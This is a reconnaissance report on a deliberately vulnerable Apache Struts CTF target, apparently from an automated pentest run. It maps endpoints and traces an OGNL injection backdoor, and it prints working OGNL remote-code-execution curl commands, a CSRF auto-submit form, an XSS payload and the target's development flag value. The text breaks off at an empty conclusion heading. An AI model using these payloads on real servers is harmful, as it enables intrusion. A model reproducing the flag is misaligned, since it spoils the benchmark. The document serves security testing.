# Reconnaissance Deliverable: XBEN-035-24 Apache Struts Application

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the XBEN-035-24 Apache Struts application's attack surface. This is an **intentionally vulnerable CTF application** with a deliberately introduced OGNL injection backdoor.

**Key Sections:**
- **Section 1 (Executive Summary):** High-level overview of the critical security posture
- **Section 3 (Authentication & Session Management):** Complete absence of auth controls
- **Section 4 (API Endpoint Inventory):** Two network-accessible endpoints (both vulnerable)
- **Section 5 (Potential Input Vectors):** Single critical input parameter enabling RCE
- **Section 7 (Role & Privilege Architecture):** No authorization system exists
- **Section 9 (Injection Sources):** OGNL injection vulnerability with complete exploitation chain

**Critical Finding:** This application has a **trivially exploitable Remote Code Execution vulnerability** via OGNL injection with zero authentication required.

**Priority for Testing:** Focus on the OGNL injection in the `message` parameter of POST /sendMessageAction - this is a deliberate backdoor enabling complete server compromise.

---

## 1. Executive Summary

**Application Type:** Apache Struts 2.5.16 web application (Intentionally vulnerable CTF target)  
**Primary Purpose:** Customer service contact form (minimal functionality serving as RCE vector)  
**Deployment:** Docker container running Tomcat 9.0.62 with OpenJDK 17.0.2  
**Target URL:** http://localhost:36769 (maps to container port 51222, but application runs on port 8080)  
**Application Access:** Currently only accessible via docker exec due to port mapping misconfiguration

### Core Technology Stack

**Frontend:**
- Server-side rendered JSP pages with Apache Struts taglibs
- No JavaScript frameworks
- HTML forms with minimal CSS styling

**Backend:**
- Language: Java 7 (source/target compatibility)
- Framework: Apache Struts 2.5.16 (Released March 2018, multiple known CVEs)
- Runtime: OpenJDK 17.0.2
- Application Server: Apache Tomcat 9.0.62
- Build Tool: Apache Maven 3.8.4

**Infrastructure:**
- Hosting: Docker container (locally deployed)
- Database: None - no persistent storage
- CDN: None

**Identified Subdomains:** None - single application deployment

**Open Ports & Services:**
- Port 80/tcp: Caddy HTTP server (redirects to HTTPS)
- Port 443/tcp: Caddy HTTPS (not configured for this application)
- Port 8080/tcp: Tomcat (inside container, not properly exposed)
- Port 36769/tcp: Docker port mapping (misconfigured - maps to non-existent container port 51222)

### Critical Security Findings

**SEVERITY: CRITICAL - Remote Code Execution**

This application contains a **deliberately introduced OGNL injection backdoor** that enables unauthenticated remote code execution:

1. **OGNL Injection RCE** - User input evaluated as OGNL expressions with unrestricted Java reflection access
2. **Disabled Security Controls** - Method execution protection explicitly bypassed in code
3. **Dangerous Configuration** - Static method access enabled, empty class/package blacklists
4. **No Authentication** - Zero authentication mechanisms, all endpoints publicly accessible
5. **No Authorization** - Complete absence of access control or role-based security
6. **Reflected XSS** - Output rendered without HTML escaping (secondary vulnerability)
7. **Vulnerable Framework** - Apache Struts 2.5.16 with multiple known CVEs
8. **Plaintext Flag Storage** - CTF flag stored unencrypted at /tmp/flag with no access controls

**Attack Complexity:** TRIVIAL - Single HTTP request achieves RCE without authentication

**Exploitation Path:**
```
POST /sendMessageAction
message=%{@java.lang.Runtime@getRuntime().exec('cat /tmp/flag')}
→ Immediate Remote Code Execution
```

---

## 2. Technology & Service Map

### Frontend
- **Framework:** Apache Struts 2 (server-side MVC)
- **Template Engine:** JavaServer Pages (JSP) with Struts taglibs
- **Key Libraries:** 
  - struts2-core:2.5.16 (CRITICAL VULNERABILITY)
  - javax.servlet-api:4.0.1
- **Authentication Libraries:** None

### Backend
- **Language:** Java 7 (compiled for backward compatibility, running on Java 17)
- **Framework:** Apache Struts 2.5.16
- **Key Dependencies:**
  - ognl:3.1.15 (application dependency - OGNL expression language)
  - ognl:3.2.12 (manually added to Tomcat lib - version conflict)
  - freemarker:2.3.26-incubating (template engine)
  - commons-fileupload:1.3.3 (unused)
  - log4j-api:2.10.0 (not configured)
  - javassist:3.20.0-GA (bytecode manipulation)

### Infrastructure
- **Hosting Provider:** Docker (local deployment)
- **CDN:** None
- **Database Type:** None - no database integration
- **Container Runtime:** Docker with docker-compose orchestration
- **Reverse Proxy:** Caddy (system-level, not configured for this application)

### Identified Subdomains
None - this is a standalone application without subdomain routing

### Open Ports & Services

| Port | Service | Version | Purpose | Accessible |
|------|---------|---------|---------|------------|
| 80/tcp | Caddy | - | HTTP server (redirects to HTTPS) | Yes (system-wide) |
| 443/tcp | HTTPS | - | SSL/HTTPS (no app routing configured) | Yes (system-wide) |
| 8080/tcp | Tomcat | 9.0.62 | Application server (inside container) | No (not published) |
| 36769/tcp | Docker Port Map | - | Maps to container port 51222 (misconfigured) | Connection refused |
| 631/tcp | CUPS | 2.3 | Print services | Yes (system service) |
| 9999/tcp | Unknown | - | Mystery service (returns "OK") | Yes |
| 49152/tcp | Tailscale | 1.82.5 | VPN service (requires auth) | Yes (401 Unauthorized) |

**Access Method:** Application currently only accessible via `docker exec xben-035-24_struts-app_1 curl http://localhost:8080/`

---

## 3. Authentication & Session Management Flow

### Entry Points
**Status: COMPLETELY ABSENT**

This application implements **ZERO authentication mechanisms**:
- No /login endpoint
- No /register endpoint  
- No /auth/* routes
- No SSO/OAuth/OIDC integration
- No password handling
- No credential verification
- No user identity management

All endpoints are accessible to **anonymous users** without any authentication requirements.

### Mechanism
**Status: NOT IMPLEMENTED**

No authentication flow exists. The application process is:
1. User navigates to / or /index → Form displayed immediately (no login required)
2. User submits message → POST /sendMessageAction processed without authentication
3. Result displayed → No session-based authentication state

**Code Pointers:**
- web.xml: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/webapp/WEB-INF/web.xml` - No `<login-config>`, `<security-constraint>`, or `<auth-method>` elements
- No authentication-related Java classes exist in the codebase

### 3.1 Role Assignment Process
**Status: NOT APPLICABLE**

No role system exists:
- **Role Determination:** N/A - no user identification
- **Default Role:** All users operate as anonymous with full access
- **Role Upgrade Path:** N/A - no privilege levels exist
- **Code Implementation:** No role assignment code exists

### 3.2 Privilege Storage & Validation
**Status: NOT IMPLEMENTED**

- **Storage Location:** N/A - no user privileges tracked
- **Validation Points:** None - no authorization checks anywhere in the application
- **Cache/Session Persistence:** Session cookies created by Tomcat but contain no authentication state
- **Code Pointers:** SendMessageAction.java:12-14 - execute() method performs zero authorization validation

### 3.3 Role Switching & Impersonation
**Status: NOT APPLICABLE**

- **Impersonation Features:** None
- **Role Switching:** None
- **Audit Trail:** None - no logging configured
- **Code Implementation:** Not implemented

### Session Management Details

**Session Cookie Configuration:**
- **Cookie Name:** JSESSIONID (Tomcat default)
- **Creation:** Automatic by Tomcat on first request
- **Security Flags:**
  - HttpOnly: Not explicitly configured (relies on Tomcat defaults)
  - Secure: **NOT SET** - cookies transmitted over HTTP
  - SameSite: **NOT SET** - vulnerable to CSRF
- **Timeout:** 30 minutes (Tomcat default)
- **Configuration File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/webapp/WEB-INF/web.xml` - No `<session-config>` element

**CRITICAL FINDINGS:**
1. No explicit session security configuration
2. Sessions transmitted over unencrypted HTTP (port 8080)
3. No session invalidation logic (no logout)
4. Session cookies vulnerable to interception (no Secure flag)
5. No CSRF protection (no SameSite attribute)

**Session Data Storage:**
- Application stores NO data in sessions
- No user credentials, tokens, or business data in session scope
- Data processed via request-scoped ValueStack only

**Code References:**
- Session creation: Implicit via JSP pages and Struts framework
- Session usage: None in application code
- Session invalidation: Not implemented

---

## 4. API Endpoint Inventory

**Network Surface Focus:** Only network-accessible endpoints through the deployed Tomcat application are included.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|------------------------|---------------------------|
| GET | / | anon | None | None | Redirects to /index. See struts.xml package-level configuration. |
| GET | /index | anon | None | None | Displays customer service contact form. Handler: `SendMessageAction.execute()` at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/java/com/example/struts/SendMessageAction.java:12-14`. View: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/webapp/index.jsp`. Config: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/resources/struts.xml:11-13`. |
| POST | /sendMessageAction | anon | None | None | **CRITICAL RCE VULNERABILITY** - Processes message submission with OGNL expression evaluation. Handler: `SendMessageAction.setMessage()` at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/java/com/example/struts/SendMessageAction.java:16-19` and `execute()` at `:12-14`. View: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/webapp/success.jsp`. Config: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/resources/struts.xml:14-21`. |
| GET | /sendMessageAction | anon | None | None | Same as POST (Struts accepts both methods by default). Vulnerable to OGNL injection via query string parameter. |
| GET/POST | /index.action | anon | None | None | Explicit .action extension version of /index endpoint. Same handler and view. |
| GET/POST | /sendMessageAction.action | anon | None | None | Explicit .action extension version of /sendMessageAction. Same RCE vulnerability. |

**Total Endpoints:** 2 distinct actions (with .action extension variations)  
**Authentication Required:** None - all endpoints publicly accessible  
**Authorization Mechanisms:** None implemented

**Endpoint Details:**

### Endpoint 1: Index/Home Page
- **Full Paths:** /, /index, /index.action
- **Handler Class:** com.example.struts.SendMessageAction
- **Handler Method:** execute() - simply returns SUCCESS constant
- **Input Processing:** None - displays empty form
- **Output:** index.jsp with customer service form
- **Interceptors:** defaultStack (standard Struts interceptors)
- **Vulnerability:** None directly, but displays form for RCE endpoint

### Endpoint 2: Message Submission (CRITICAL)
- **Full Paths:** /sendMessageAction, /sendMessageAction.action
- **Handler Class:** com.example.struts.SendMessageAction
- **Handler Methods:** 
  - setMessage(String message) - Line 16-19: **OGNL injection vulnerability**
  - execute() - Line 12-14: Returns SUCCESS
- **Input Processing:** OGNL expression evaluation via TextParseUtil.translateVariables()
- **Output:** success.jsp with reflected message (XSS vulnerability)
- **Interceptors:**
  - defaultStack - Standard Struts interceptors
  - params - Parameter binding with minimal filtering (excludes only dojo.* and struts.* parameters)
- **Vulnerabilities:**
  1. OGNL Injection RCE (CRITICAL)
  2. Reflected XSS (HIGH)
  3. No input validation
  4. No CSRF protection

**Configuration Reference:**
```xml
Location: /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/resources/struts.xml:14-21

<action name="sendMessageAction" class="com.example.struts.SendMessageAction">
    <result>/success.jsp</result>
    <interceptor-ref name="defaultStack" />
    <interceptor-ref name="params">
        <param name="excludeParams">dojo\..*,^struts\..*</param>
    </interceptor-ref>
    <param name="message" />
</action>
```

---

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** Only input vectors accessible through network requests to the deployed application.

### URL Parameters
**Endpoint:** GET /sendMessageAction  
**Parameters:**
- `message` - String parameter, unlimited length, no validation
- **Location:** Can be passed as query string: `/sendMessageAction?message=value`
- **Vulnerability:** OGNL injection
- **Handler:** SendMessageAction.setMessage() at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/java/com/example/struts/SendMessageAction.java:16-19`

### POST Body Fields (Form-Encoded)
**Endpoint:** POST /sendMessageAction  
**Content-Type:** application/x-www-form-urlencoded  
**Fields:**
- `message` - String field from textarea
  - **Form Element:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/webapp/index.jsp:56`
  - **Field Type:** textarea (6 rows, 30 cols)
  - **Validation:** NONE
  - **Sanitization:** NONE - deliberately evaluates as OGNL
  - **Processing:** SendMessageAction.setMessage():18 - `TextParseUtil.translateVariables(message, ...)`
  - **Dangerous Operations:**
    1. Line 17: `ReflectionContextState.setDenyMethodExecution(..., false)` - Disables security
    2. Line 18: OGNL expression evaluation on user input
  - **Data Flow:**
    ```
    User Input (index.jsp:56) 
    → Struts params interceptor (struts.xml:17-19)
    → SendMessageAction.setMessage() (SendMessageAction.java:16)
    → Security bypass (Line 17)
    → OGNL evaluation (Line 18)
    → Runtime.exec() possible via OGNL
    ```

### HTTP Headers
**No custom header processing identified**

The application does not read or process custom HTTP headers for business logic. Standard Struts headers (Content-Type, etc.) are processed by the framework but not used for injection attacks.

**Note:** The application may be vulnerable to HTTP Header Injection in Struts itself due to the outdated version (2.5.16), but the application code does not process custom headers.

### Cookie Values
**Session Cookie:** JSESSIONID
- **Purpose:** Session tracking (Tomcat default)
- **Security Flags:** Not configured (HttpOnly potentially enabled by default, Secure and SameSite missing)
- **Vulnerability:** Session hijacking via network interception (transmitted over HTTP)
- **Not Injectable:** Session ID itself is not processed by application logic for OGNL injection

**No Application Cookies:** Application does not set or read custom cookie values beyond JSESSIONID.

### Complete Input Vector List with File References

| Input Vector | Type | Endpoint | File:Line | Validation | Dangerous Operation |
|--------------|------|----------|-----------|------------|---------------------|
| message (POST body) | String (textarea) | POST /sendMessageAction | index.jsp:56 → SendMessageAction.java:16-19 | NONE | OGNL evaluation → RCE |
| message (query param) | String (URL param) | GET /sendMessageAction | SendMessageAction.java:16-19 | NONE | OGNL evaluation → RCE |

**Total Input Vectors:** 1 parameter (accessible via 2 methods: POST body and GET query string)

---

## 6. Network & Interaction Map

**Network Surface Focus:** Only components within the deployed, network-accessible infrastructure.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| XBEN-035-Struts-App | Service | App | Java/Struts 2.5.16, Tomcat 9.0.62 | PII (messages), Flag (plaintext) | Main vulnerable application backend, intentionally vulnerable CTF target |
| Tomcat-Container | Service | App | Apache Tomcat 9.0.62, OpenJDK 17.0.2 | PII, Flag | Servlet container running Struts application |
| Docker-Host | Service | Edge | Docker, port mapping | Public | Container host with misconfigured port mapping (36769→51222 instead of 8080) |
| CTF-Flag-File | DataStore | App | Filesystem (/tmp/flag) | Flag (plaintext) | Unencrypted flag storage, accessible via RCE |
| Client-Browser | ExternAsset | Internet | Web Browser | Public | External attacker or legitimate user (no distinction - no auth) |
| Caddy-Proxy | Service | Edge | Caddy HTTP server | Public | System-wide reverse proxy, not configured for this application |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| XBEN-035-Struts-App | Hosts: `http://localhost:8080` (inside container); Endpoints: `/index`, `/sendMessageAction`; Auth: None; Session: JSESSIONID (insecure); Dependencies: Tomcat-Container, CTF-Flag-File; Vulnerabilities: OGNL Injection RCE, Reflected XSS, No Authentication |
| Tomcat-Container | Engine: `Apache Tomcat 9.0.62`; Runtime: `OpenJDK 17.0.2`; Exposure: `Container-internal port 8080, misconfigured external mapping 36769→51222`; Consumers: `XBEN-035-Struts-App`; Config: Default Tomcat settings, no security hardening |
| Docker-Host | Port Mapping: `36769:51222 (broken), 8080 exposed but not published`; Network: `Bridge network (default)`; Health Check: `curl -f http://localhost:8080/` (passing); Access: `docker exec only due to port misconfiguration` |
| CTF-Flag-File | Path: `/tmp/flag`; Permissions: `Default (likely world-readable)`; Encryption: `None (plaintext)`; Access Control: `None`; Content: `flag{...}` format; Accessible via: `RCE through OGNL injection` |
| Client-Browser | User Agent: `Any`; Authentication: `Not required`; Origin: `Internet (external attacker perspective)`; Access Method: `Currently blocked - docker exec workaround required` |
| Caddy-Proxy | Ports: `80/tcp (HTTP), 443/tcp (HTTPS)`; Config: `/opt/homebrew/etc/Caddyfile`; Routes: `*.kgtest.host → localhost:2000` (XBEN-035 not configured); TLS: `Configured for kgtest.host only` |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| Client-Browser → Docker-Host | HTTPS/HTTP | `:36769 /sendMessageAction` | None | Public, PII (message input) |
| Docker-Host → Tomcat-Container | Internal | `:51222 → :8080 (broken mapping)` | None | PII |
| Tomcat-Container → XBEN-035-Struts-App | Internal | `:8080 /sendMessageAction` | None | PII, malicious OGNL |
| XBEN-035-Struts-App → Tomcat-Container | Internal | HTTP Response | None | PII, XSS payload |
| XBEN-035-Struts-App → CTF-Flag-File | Filesystem | `/tmp/flag` | None (via RCE) | Flag (plaintext) |
| Tomcat-Container → Docker-Host | Internal | Port 8080 → 51222 | None | Public |
| Docker-Host → Client-Browser | HTTPS/HTTP | Port 36769 response | None | Public, PII, XSS |

**Critical Flow - RCE Attack Path:**
```
Client-Browser → Docker-Host (:36769) 
  → [BROKEN: maps to :51222 instead of :8080]
  → [WORKAROUND: docker exec into container]
  → Tomcat-Container (:8080)
  → XBEN-035-Struts-App (SendMessageAction.setMessage())
  → OGNL Expression Evaluation (Line 18)
  → Java Runtime.exec() via Reflection
  → System Shell
  → CTF-Flag-File (/tmp/flag)
  → Flag Exfiltration
```

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| None | Auth | No authentication guards exist - all endpoints publicly accessible |
| None | Authorization | No authorization guards exist - no role or permission checks |
| None | Network | No network-level restrictions - application accepts all connections |
| params-filter | Protocol | Struts params interceptor excludes only `dojo.*` and `struts.*` parameters - insufficient protection (struts.xml:17-19) |
| None | RateLimit | No rate limiting implemented |
| None | CSRF | No CSRF protection - no token validation |
| None | Input Validation | No input validation guards - all input accepted and processed |
| DELIBERATELY-DISABLED | Security | Method execution denial EXPLICITLY disabled at SendMessageAction.java:17 - intentional backdoor |

**CRITICAL FINDING:** This application has **ZERO security guards**. Every security control is either absent or deliberately disabled. The only "guard" is a parameter name filter that excludes framework-internal parameters but provides no security benefit.

---

## 7. Role & Privilege Architecture

### 7.1 Discovered Roles

**Status: NO ROLE SYSTEM EXISTS**

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|-----------------|--------------|---------------------|
| anonymous | 0 (full access) | Global | Default - no authentication exists, all users operate as anonymous with unrestricted access |

**Analysis:** This application implements ZERO role-based access control. All users, including unauthenticated attackers, have identical access rights to all functionality including the RCE vulnerability.

**Evidence:**
- web.xml: No `<security-role>` elements at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/webapp/WEB-INF/web.xml`
- Java code: No role constants, enums, or permission checks in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/java/com/example/struts/SendMessageAction.java`
- struts.xml: No role-based interceptors configured at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/resources/struts.xml`

### 7.2 Privilege Lattice

**Status: NOT APPLICABLE**

No role hierarchy exists. Privilege model is:

```
All Users = Anonymous = Full Access
```

**No Role Ordering:** All users operate at the same privilege level with complete access to all endpoints and functionality.

**No Isolation:** No privilege boundaries, no tenant separation, no resource ownership validation.

### 7.3 Role Entry Points

**Status: ALL ENDPOINTS ACCESSIBLE TO ANONYMOUS USERS**

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|---------------------------|----------------------|
| anonymous (all users) | / or /index | `/*` - All routes publicly accessible | None |

**Analysis:** Every endpoint accepts anonymous access. No authentication required for any functionality, including the RCE-vulnerable /sendMessageAction endpoint.

### 7.4 Role-to-Code Mapping

**Status: NOT APPLICABLE - NO ROLES EXIST**

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|-------------------|-------------------|------------------|
| N/A | None | None | N/A |

**Code Analysis:**
- SendMessageAction.execute() at line 12-14: No authorization checks
- No Struts role-based interceptors configured
- No custom authorization middleware
- No permission validation anywhere in the codebase

---

## 8. Authorization Vulnerability Candidates

### 8.1 Horizontal Privilege Escalation Candidates

**Status: NOT APPLICABLE**

No horizontal privilege escalation vulnerabilities exist because:
1. No user accounts or user-specific resources exist
2. No object identifiers (user_id, order_id, etc.) in any endpoints
3. No concept of "ownership" or "user resources"
4. Application has no database or persistent storage

**Analysis:** Traditional horizontal privilege escalation (accessing another user's resources) is not relevant to this architecture. The only "privilege escalation" is from anonymous user to system administrator via RCE.

### 8.2 Vertical Privilege Escalation Candidates

**Status: NOT APPLICABLE - NO PRIVILEGE LEVELS EXIST**

All users operate with identical privileges. Traditional vertical privilege escalation (user → admin) is not relevant because:
- No role hierarchy exists
- No administrative endpoints exist
- All users are effectively administrators (unrestricted access)

**However, the RCE vulnerability enables escalation from web application context to operating system root:**

| Target Privilege | Endpoint/Method | Functionality | Risk Level |
|-----------------|-----------------|---------------|-----------|
| OS-level shell access | POST /sendMessageAction | OGNL injection → Runtime.exec() → Shell commands | CRITICAL |
| Container root | POST /sendMessageAction | Execute commands as container user (typically root or tomcat) | CRITICAL |
| File system access | POST /sendMessageAction | Read /tmp/flag and other files via command execution | CRITICAL |

### 8.3 Context-Based Authorization Candidates

**Status: NOT APPLICABLE**

No multi-step workflows exist. The application has only two simple endpoints:
1. GET /index - Display form
2. POST /sendMessageAction - Process message

No workflow state, no multi-step processes, no state machine to bypass.

---

## 9. Injection Sources (Command Injection and SQL Injection)

**Network Surface Focus:** Only injection sources accessible through network requests to the deployed application.

### CRITICAL FINDING: OGNL Injection → Remote Code Execution

**Injection Type:** OGNL Expression Injection (enables Command Injection via Runtime.exec())

#### Source #1: OGNL Injection in 'message' Parameter

**Input Parameter:** `message`

**Entry Point:** POST /sendMessageAction (also accessible via GET)  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/java/com/example/struts/SendMessageAction.java:16`

**Complete Data Flow:**

1. **User Input Received**  
   File: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/webapp/index.jsp:56`
   ```jsp
   <s:textarea name="message" label="Message" rows="6" cols="30" />
   ```

2. **HTTP Request Processing**  
   File: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/webapp/WEB-INF/web.xml:9-16`
   - All requests routed through StrutsPrepareAndExecuteFilter
   - Filter pattern: `/*` (all URLs)

3. **Action Mapping**  
   File: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/resources/struts.xml:14-21`
   - Request mapped to SendMessageAction
   - params interceptor binds message parameter
   - Minimal filtering: excludes only `dojo.*` and `struts.*` parameters

4. **Security Control Bypass (DELIBERATE BACKDOOR)**  
   File: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/java/com/example/struts/SendMessageAction.java:17`
   ```java
   ReflectionContextState.setDenyMethodExecution(ActionContext.getContext().getContextMap(), false);
   ```
   **CRITICAL:** Explicitly disables Struts' method execution protection designed to prevent OGNL-based RCE

5. **OGNL Expression Evaluation (DANGEROUS SINK)**  
   File: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/java/com/example/struts/SendMessageAction.java:18`
   ```java
   this.message = TextParseUtil.translateVariables(message, ActionContext.getContext().getValueStack());
   ```
   **PRIMARY VULNERABILITY:** User-controlled input evaluated as OGNL expression with full Java reflection access

6. **Command Execution via OGNL**  
   The evaluated OGNL expression can invoke:
   ```java
   @java.lang.Runtime@getRuntime().exec('command')
   ```
   Enabled by configuration at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/resources/struts.xml:6-8`:
   ```xml
   <constant name="struts.ognl.allowStaticMethodAccess" value="true"/>
   <constant name="struts.excludedClasses" value=""/>
   <constant name="struts.excludedPackageNames" value=""/>
   ```

**Dangerous Configuration Issues:**

| Config Setting | File:Line | Impact |
|----------------|-----------|--------|
| allowStaticMethodAccess="true" | struts.xml:6 | Allows calling Runtime.getRuntime().exec() |
| excludedClasses="" | struts.xml:7 | Removes blacklist for Runtime, ProcessBuilder, ClassLoader |
| excludedPackageNames="" | struts.xml:8 | Removes package-level restrictions (java.lang.*, etc.) |
| setDenyMethodExecution(false) | SendMessageAction.java:17 | Disables method execution protection |
| translateVariables() on user input | SendMessageAction.java:18 | Evaluates OGNL expressions |

**Exploitability:** TRIVIAL

**Proof of Concept:**
```bash
# Via POST
curl -X POST http://localhost:8080/sendMessageAction \
  -d "message=%{@java.lang.Runtime@getRuntime().exec('cat /tmp/flag')}"

# Via GET
curl "http://localhost:8080/sendMessageAction?message=%{@java.lang.Runtime@getRuntime().exec('cat%20/tmp/flag')}"
```

**Impact:**
- Immediate Remote Code Execution
- Full server compromise
- CTF flag retrieval from /tmp/flag
- Reverse shell capability
- Data exfiltration
- Lateral movement potential

### SQL Injection Sources

**Status: NONE FOUND**

**Analysis:** The application has no database integration, therefore no SQL injection attack surface exists.

**Evidence:**
- No JDBC imports in SendMessageAction.java
- No database configuration files
- No ORM frameworks (Hibernate, JPA, MyBatis)
- pom.xml contains no database drivers or connection libraries

**Conclusion:** SQL injection is not applicable to this application architecture.

### Command Injection Sources (Traditional)

**Status: NONE FOUND (except via OGNL)**

**Analysis:** The application code does not directly call Runtime.exec(), ProcessBuilder, or system commands. However, the OGNL injection vulnerability allows attackers to invoke these methods via reflection.

**Distinction:** This is OGNL Injection that enables command execution, not traditional command injection where user input is concatenated into shell command strings.

### Summary of Injection Sources

| Injection Type | Parameter | Endpoint | File:Line | Exploitability |
|----------------|-----------|----------|-----------|----------------|
| OGNL Injection → RCE | message | POST /sendMessageAction | SendMessageAction.java:18 | TRIVIAL |
| Reflected XSS | message | POST /sendMessageAction | success.jsp:44 | TRIVIAL |
| SQL Injection | N/A | N/A | N/A | Not Applicable |
| Traditional Command Injection | N/A | N/A | N/A | Not Applicable |

**Total Critical Injection Sources:** 1 (OGNL Injection with RCE capability)

---

## 10. Additional Security Findings

### 10.1 Cross-Site Scripting (XSS)

**XSS Sink #1: Reflected XSS in success.jsp**

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/src/main/webapp/success.jsp:44`

```jsp
<p><s:property value="message" escapeHtml="false"/></p>
```

**Vulnerability:** HTML escaping explicitly disabled via `escapeHtml="false"`

**Data Flow:**
1. User submits message parameter
2. OGNL evaluation processes input (SendMessageAction.java:18)
3. Result stored in message field
4. success.jsp renders message without HTML escaping
5. JavaScript executes in victim's browser

**Exploitation:**
```
message=<script>alert(document.domain)</script>
```

**Impact:**
- Session hijacking (if HttpOnly not enforced on JSESSIONID)
- Credential harvesting
- Defacement
- Keylogging and form data exfiltration

**Severity:** HIGH (but overshadowed by CRITICAL RCE vulnerability)

### 10.2 Cross-Site Request Forgery (CSRF)

**Status: NO CSRF PROTECTION**

**Evidence:**
- No token interceptor configured in struts.xml:16-19
- Forms contain no CSRF tokens (index.jsp:55-58)
- No SameSite cookie attribute
- No Origin/Referer validation

**Attack Vector:**
External site can submit malicious OGNL expressions via CSRF:
```html
<form action="http://vulnerable-app:8080/sendMessageAction" method="POST">
  <input type="hidden" name="message" value="%{@java.lang.Runtime@getRuntime().exec('malicious_command')}">
</form>
<script>document.forms[0].submit();</script>
```

**Impact:** RCE via CSRF (if victim has active session and visits attacker's page)

### 10.3 Security Headers

**Status: COMPLETELY ABSENT**

**Missing Headers:**
- Content-Security-Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- X-XSS-Protection
- Strict-Transport-Security (HSTS)
- Referrer-Policy
- Permissions-Policy

**Impact:**
- No XSS mitigation via CSP
- Vulnerable to clickjacking (no X-Frame-Options)
- MIME sniffing allowed (no X-Content-Type-Options)
- No HTTPS enforcement (no HSTS)

### 10.4 Cryptography & Transport Security

**TLS/HTTPS:** NOT IMPLEMENTED

**Evidence:**
- Dockerfile exposes only HTTP port 8080
- No TLS certificate configuration
- No HTTPS connector in Tomcat
- All traffic transmitted in plaintext

**Impact:**
- Session cookies interceptable via network sniffing
- Man-in-the-middle attacks
- Credential interception (if auth existed)
- Complete traffic visibility to network attackers

### 10.5 Logging & Monitoring

**Status: NOT IMPLEMENTED**

**Evidence:**
- log4j-api:2.10.0 dependency exists but no configuration
- No logging code in SendMessageAction.java
- No audit trail of actions
- No security event logging
- No intrusion detection

**Impact:**
- Attacks completely invisible
- No forensic evidence
- No detection of RCE exploitation
- No alerting on suspicious patterns

---

## 11. CTF Flag Intelligence

**Flag Location:** `/tmp/flag` (inside Docker container)

**Storage Method:** Plaintext file

**Access Control:** None

**Dockerfile Configuration:**  
File: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/web/Dockerfile:20-21`
```dockerfile
ARG FLAG
RUN echo "$FLAG" > /tmp/flag
```

**Retrieval Method:** Command execution via OGNL injection

**Exploitation:**
```bash
# Step 1: Exploit OGNL injection to execute command
curl -X POST http://localhost:8080/sendMessageAction \
  -d "message=%{@java.lang.Runtime@getRuntime().exec('cat /tmp/flag')}"

# Alternative: Use OGNL to read file directly
message=%{@org.apache.commons.io.FileUtils@readFileToString(@java.io.File@new('/tmp/flag'))}
```

**Development Flag (from .env):** `flag{18bda514-8e51-45b5-86d6-e1cdf84ab406}`

**Note:** Production deployment likely uses different flag value injected at build time.

---

## 12. Infrastructure & Deployment Intelligence

### Container Configuration

**Base Image:** tomcat:9.0.62-jdk17-openjdk (multi-stage build)  
**Build Stage:** maven:3.8.4-openjdk-17 (for compilation)  
**Runtime:** OpenJDK 17.0.2 with Tomcat 9.0.62

**Exposed Ports:**
- Internal: 8080/tcp (Tomcat HTTP)
- External mapping: 36769:51222 (MISCONFIGURED - should be 36769:8080)

**Environment Variables:**
- JAVA_OPTS=-Djava.security.egd=file:/dev/./urandom

**Health Check:**
```yaml
test: ["CMD", "curl", "-f", "http://localhost:8080/"]
timeout: 1s
retries: 5
interval: 10s
```
Status: HEALTHY (container is running, but not accessible externally due to port mapping error)

### Docker Compose Configuration

File: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-035-24/docker-compose.yml`

**Services:** 1 (struts-app)  
**Networks:** Default bridge network  
**Volumes:** None  
**Dependencies:** None

**Critical Misconfiguration:**
```yaml
ports:
  - "51222"  # Maps to container port 51222, but app runs on 8080
```

**Should be:**
```yaml
ports:
  - "36769:8080"  # Map host 36769 to container 8080
```

### Current Access Method

Due to port mapping error, application is only accessible via:
```bash
docker exec xben-035-24_struts-app_1 curl http://localhost:8080/[endpoint]
```

External access via http://localhost:36769 fails with "Connection reset by peer"

---

## 13. Conclusion & Recommendations

### Security Posture Summary

